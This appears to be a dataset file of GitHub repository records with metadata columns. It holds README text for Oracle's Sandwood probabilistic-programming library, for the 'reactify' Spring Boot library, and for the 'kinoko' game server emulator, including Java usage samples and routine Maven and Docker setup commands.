![Picture describing the classes created for the example HMM model](docs/images/ModelClasses.jpg ""Picture describing the classes created for the example HMM model"")

By running the compiler with the `javadoc` flag set JavaDoc will be created for each public method and class in the generated model file.

### Using Compiled Models
Once the model has been compiled we need to instantiate instances of it. These instances are independent and the user can create as many different copies of the model as they wish.

#### Constructing a model
Instances of the model object are constructed via the class constructor. As described earlier there are typically 3 constructors for the model. The only case when there will be fewer is when the different variants of the constructor map to the same signature, in which case one constructor will apply to more than one of these scenarios.

* Full constructor - This constructor takes all the arguments that appear in the model signature and sets them. This constructor is used for the infer values and infer probabilities operations.

* Empty constructor - This constructor takes no arguments, leaving the parameters for the user to set later.

* Execution Constructor - This constructor removes arguments that are only observed, and for observed arguments whose dimensions are used as inputs to the code, takes those dimensions instead of the full parameters. So in the HMM example the eventsMeasured parameter will become an integer describing the length of the sequence.

These code samples demonstrate how to make calls to the compiled models.

#### Interacting with a model
Interactions with a model via the model object takes two forms:

* Calls to model object methods for global operations such as setting default retention policies, checking if the model is ready for inference, and starting inference steps, etc. 

* Calls to model parameter objects. Each named public variable in the model is represented by a corresponding field in the model object. Variables are public if they are declared in the outermost scope of the model and not labelled `private`, or are declared in an inner scope and are not labelled `public`. If a field is declared public in an inner iterative scope, for example the body of a for loop, the value from each iteration will be stored.

  The type of the object will depend on the variable. These can be split into 3 categories:
  1. Observed variables: These are scalar or array variables that are set by the user.
  2. Inferred variables: These are scalar or array variables inferred by the model.
  3. Random variables: These [Random Variables](https://en.wikipedia.org/wiki/Random_variable) declared as named fields in the model. These can only have their probability queried.

  Each of these fields references an object with a set of methods that allow the user to set and read values and properties from the parameter. Properties that can be set and read include the probability of the parameter, the retention policy of the parameter, and if the parameter should be fixed at its current value.

Some of the more important methods of the parameter object when performing model inference are:

  * getSamples to return sampled values.

  * getMAP to return the [Maximum A Posteriori](https://en.wikipedia.org/wiki/Maximum_a_posteriori_estimation) value.

  * setValue to allow a value to be set to a specific value.

  * setFixed which takes a `boolean` to mark the value as fixed, and therefore not to be updated during inference. It is important to set the value of the parameter before fixing it.
  
  * getLogProbability which gets the log probability of the variable after inferring probabilities.
    
There are more methods, and we recommend consulting the JavaDoc to familiarise yourself with them.

#### Model operations

There are 3 basic types of operation that can be performed on a model:

1. **Infer Values** Having set the value of some of the variables of a model, infer values for the remaining variables. For the results of this method to be of interest some of the inferred values will need to be recorded. This can be done by recording the inferred values for every unset variable in the model model, or just a subset of the variables. The retention policy can be set for the entire model by a call to the method `setRentionPolicy` in the model class. Optionally individual variables can then have their retention policy set by calls to the corresponding `setRetentionPolicy` method in each variable object.

There are 3 sampling policies:
  * _NONE_  records no values. This is particularly useful if one of the variables is large so taking the time and space to store it would be wasteful.

  * _SAMPLE_  records the value from every iteration of the inference algorithm, so if 1000 iterations are performed 1000 values will be sampled from the each variable set to this retention policy. This is useful for calculating the variance as well as the average value. There is a weakness to this though, if the positions of values within the model can move during the inference then the values cannot be averaged over. For example with a topic model topics 2 and 3 may swap places during the inference, so averaging all the values for topic 2 with produce a mixture of topic 2 and topic 3. To overcome this Maximum A Posteriori (MAP) is also provided as a retention policy.

  * _MAP_  or [Maximum A Posteriori (MAP)](https://en.wikipedia.org/wiki/Maximum_a_posteriori_estimation) records the values of the variables when the model is in its most probable state. This overcomes the issue with transient value positions meaning values cannot be averaged, but at the expense of being able to calculate bounds. This option also has space advantages if some of the variables are large.

Configuration: Additional method calls on the model object allow the user to set properties such as  _burnin_  and  _thinning_  when performing this inference step. Burnin ignores the values from the first  _n_  iterations allowing the model to move away from a low probability starting point before starting to sample. Thinning reduces the autocorrelation induced by the MCMC procedure by only considering the values from every  _n_ th iteration.

2. **Infer Probabilities** Having set the values of some or all the parameters in the model calculate the probability of generating those values. This can be calculated for each variable in the model and for the model as a whole. 

3. **Execute Model** Run the model as if it was regular code generating new values for any parameters that are not fixed by the user. An example of when this behaviour would be used is for a linear regression model. In this case the model coefficients would first be inferred using training data. Once they have been inferred they would be fixed and new input data set. The model would then be executed to generate the corresponding predictions for this new input data. This form of execution could also be used to generate representative synthetic data from a trained model.

**Construct and train a model**

```java
//Load inputs
int nStates = 25;
int[] actions = loadActions(....);
int nActions = maxActions(....);

//Construct the model
HMM model = new HMM(actions, nActions, nStates);

//Set the retention policies
model.setDefaultRetentionPolicy(RetentionPolicy.MAP);
model.st.setRetentionPolicy(RetentionPolicy.NONE);

//Pick a random number generator. The ones introduced in Java 17 are faster and better quality.
model.setRNGType(RandomType.L64X1024MixRandom);

//Instruct the model to use the ForkJoin framework for parallel execution.
model.setExecutionTarget(ExecutionTarget.forkJoin);

//Run 2000 inference steps to infer model values
model.inferValues(2000);

//Gather the results.
double[] initialState = model.initialState.getMAP();
double[][] bias = model.bias.getMAP();
double[][] transitions = model.m.getMAP();
```

**Construct model and infer probabilities**

```java
//Load inputs
int nStates = 25;
int[] actions = loadActions(....);
int nActions = maxActions(....);

//Load model parameters
double[][] bias = model.bias.getMAP();
double[][] transitions = model.m.getMAP();

//Construct the model
HMM model = new HMM(actions, nActions, nStates);

//Set and fix trained values
model.bias.setValue(bias);
Model.m.setValue(transitions);

//Run 2000 inference steps to infer probabilities
model.inferProbabilities(2000);

//Recover the probabilities of the model parameter actions.
double actionsProbability = model.actions.getProbability();

//Recover the probability of the model as a whole
double modelProbability = model.getProbability()
```

**Train and execute a Liner Regression model**

```java
//Load parameters
double[] xs = loadXs(....);
double[] ys = loadYs(....);

//Construct the model
LinearRegression model = new LinearRegression(xs, ys);
…
//Run 2000 inference steps to c, m, and sigma.
model.inferValues(2000);

//Fix the inferred values
model.c.setFixed(true);
model.m.setFixed(true);
model.sigma.setFixed(true);

//Set new input values
double[] new_xs = loadXs(....);
model.xs.setValue(new_xs);

//Run the model to generate sequences of actions using the inferred values
model.execute(1000);

//Recover the generated values
double[][] new_ys = model.ys.getSamples();
```

## Help
For help with Sandwood please start or join a discussion on the [discussions page](https://github.com/oracle/sandwood/discussions).

## Contributing
This project welcomes contributions from the community. Before submitting a pull
request, please [review our contribution guide](./CONTRIBUTING.md).

## Security

Please consult the [security guide](./SECURITY.md) for our responsible security
vulnerability disclosure process.

## License
Copyright (c) 2019-2024 Oracle and/or its affiliates.

Released under the Universal Permissive License v1.0 as shown at
<https://oss.oracle.com/licenses/upl/>.

",1,0,1,1.0,"['sandwood', 'what', 'probabilistic', 'programming', 'installation', 'command', 'line', 'tool', 'java', 'library', 'call', 'maven', 'plugin', 'documentation', 'example', 'model', 'sandwood', 'language', 'compile', 'model', 'use', 'compiled', 'model', 'construct', 'model', 'interact', 'model', 'model', 'operation', 'help', 'contribute', 'security', 'license']","['model', 'sandwood', 'what', 'probabilistic', 'programming']",12.0,"[maven-assembly-plugin,maven-clean-plugin,maven-resources-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-plugin-plugin,org.apache.maven.plugins:maven-site-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:javacc-maven-plugin,org.sandwood:sandwoodc-maven-plugin]",0.0,8.0,3.0
hoangtien2k3/reactify,main,"<h3 align=""center"">
<img src=""docs/images/reactify_banner.png"" alt=""Ezbuy"" width=""300"" />

<a href=""https://github.com/hoangtien2k3/reactify/blob/main/docs/en/README.md"">📚Docs</a> |
<a href=""https://github.com/hoangtien2k3/reactify/blob/main/docs/en/README.md"">💬Chat</a> |
<a href=""https://github.com/hoangtien2k3/reactify/blob/main/docs/en/README.md"">✨Live Demo</a>
</h3>

##

Reactify [a commons Java lib]() with spring boot framework, Supports using keycloak, filter, trace log, cached, minio
server, exception handler, validate and call API with webclient

This README provides quickstart instructions on running [`reactify`]() on bare metal project spring boot.

[![SonarCloud](https://sonarcloud.io/images/project_badges/sonarcloud-white.svg)](https://sonarcloud.io/summary/new_code?id=hoangtien2k3_reactify)

[![CircleCI](https://circleci.com/gh/hoangtien2k3/reactify.svg?style=svg)](https://app.circleci.com/pipelines/github/hoangtien2k3/reactify)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=hoangtien2k3_reactify&metric=alert_status)](https://sonarcloud.io/summary/new_code?id=hoangtien2k3_reactify)
[![Lines of Code](https://sonarcloud.io/api/project_badges/measure?project=hoangtien2k3_reactify&metric=ncloc)](https://sonarcloud.io/summary/overall?id=hoangtien2k3_reactify)
[![GitHub Release](https://img.shields.io/github/v/release/hoangtien2k3/reactify?label=latest%20release)](https://mvnrepository.com/artifact/io.github.hoangtien2k3/reactify)
[![License](https://img.shields.io/badge/license-Apache--2.0-green.svg)](https://www.apache.org/licenses/LICENSE-2.0.html)
[![OpenSSF Best Practices](https://www.bestpractices.dev/projects/9383/badge)](https://www.bestpractices.dev/projects/9383)
[![Build status](https://github.com/ponfee/commons-core/workflows/build-with-maven/badge.svg)](https://github.com/hoangtien2k3/reactify/actions)

## Download
Gradle is the only supported build configuration, so just add the dependency to your project build.gradle file:

⬇️ Download Gradle and Maven

```kotlin
dependencies {
  implementation 'io.github.hoangtien2k3:reactify:$latest'
}
```

```maven
<dependency>
   <groupId>io.github.hoangtien2k3</groupId>
   <artifactId>reactify</artifactId>
   <version>${latest}</version>
</dependency>
```

The latest `reactify` version is: [![GitHub Release](https://img.shields.io/github/v/release/hoangtien2k3/reactify?label=latest)](https://mvnrepository.com/artifact/io.github.hoangtien2k3/reactify)

The latest stable lib `reactify` version is: latestVersion Click [here](https://central.sonatype.com/namespace/io.github.hoangtien2k3) for more information on reactify.

## Getting Started

1. Correct and complete setup to start the program `application.yml` or `application.properties`
   with [CONFIG](src/main/resources/application.yml)

2. The [reference documentation]() includes detailed [installation instructions]() as well as a
   comprehensive [getting started]() guide.

Here is a quick teaser of a complete Spring Boot application in Java:

```java
@SpringBootApplication
@ComponentScan(basePackages = {""io.hoangtien2k3.reactify.*""})
@ImportResource({""classpath*:applicationContext.xml""})
public class Example {

    @RequestMapping(""/"")
    String home() {
        return ""Hello World!"";
    }

    public static void main(String[] args) {
        SpringApplication.run(Example.class, args);
    }
}
```

## Contributing

If you would like to contribute to the development of this project, please follow our contribution guidelines.

![Alt](https://repobeats.axiom.co/api/embed/31a861bf21d352264c5c122808407abafb97b0ef.svg ""Repobeats analytics image"")


## Star History

<a href=""https://star-history.com/#hoangtien2k3/fw-commons&Timeline"">
 <picture>
   <source media=""(prefers-color-scheme: dark)"" srcset=""https://api.star-history.com/svg?repos=hoangtien2k3/fw-commons&type=Timeline&theme=dark"" />
   <source media=""(prefers-color-scheme: light)"" srcset=""https://api.star-history.com/svg?repos=hoangtien2k3/fw-commons&type=Timeline"" />
   <img alt=""Star History Chart"" src=""https://api.star-history.com/svg?repos=hoangtien2k3/fw-commons&type=Timeline"" />
 </picture>
</a>

## Contributors ✨

<a href=""https://github.com/hoangtien2k3/reactify/graphs/contributors"">
  <img src=""https://contrib.rocks/image?repo=hoangtien2k3/reactify"" />
</a>

## License

This project is licensed under the [Apache License, Version 2.0](https://www.apache.org/licenses/LICENSE-2.0)

```
Apache License
Copyright (c) 2024 Hoàng Anh Tiến
```
",6,0,15,1.0,"['download', 'get', 'start', 'contribute', 'star', 'history', 'contributor', 'license']","['download', 'get', 'start', 'contribute', 'star']",3.0,"[com.diffplug.spotless:spotless-maven-plugin,com.mycila:license-maven-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,2.0,1.0
iw2d/kinoko,main,"## Kinoko
Kinoko is a server emulator for the popular mushroom game.


## Setup
Basic configuration is available via environment variables - the names and default values of the configurable options are defined in [ServerConstants.java](src/main/java/kinoko/server/ServerConstants.java) and [ServerConfig.java](src/main/java/kinoko/server/ServerConfig.java).

> [!NOTE]
> Client WZ files are expected to be present in the `wz/` directory in order for the provider classes to extract the required data. The required files are as follows:
> ```
> Character.wz
> Item.wz
> Skill.wz
> Morph.wz
> Map.wz
> Mob.wz
> Npc.wz
> Reactor.wz
> Quest.wz
> String.wz
> Etc.wz
> ```

#### Java setup
Building the project requires Java 21 and maven.

```bash
# Build jar
$ mvn clean package
```


#### Database setup
It is possible to use either CassandraDB or ScyllaDB, no setup is required other than starting the database.
```bash
# Start CassandraDB
$ docker run -d -p 9042:9042 cassandra:5.0.0

# Alternatively, start ScyllaDB
$ docker run -d -p 9042:9042 scylladb/scylla --smp 1
```
You can use [Docker Desktop](https://www.docker.com/products/docker-desktop/) or WSL on Windows.


#### Docker setup
Alternatively, docker can be used to build and start the server and the database using the [docker-compose.yml](docker-compose.yml) file. The requirements are as follows:
- docker : required for building and running the server and database containers
- cqlsh : required for the health check for the database container

```bash
# Build and start containers
$ docker compose up -d
```
",0,9,1,7.0,"['kinoko', 'setup', 'java', 'setup', 'build', 'jar', 'database', 'setup', 'start', 'cassandradb', 'alternatively', 'start', 'scylladb', 'docker', 'setup', 'build', 'start', 'container']","['setup', 'start', 'build', 'kinoko', 'java']",1.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-jar-plugin]",0.0,1.0,0.0
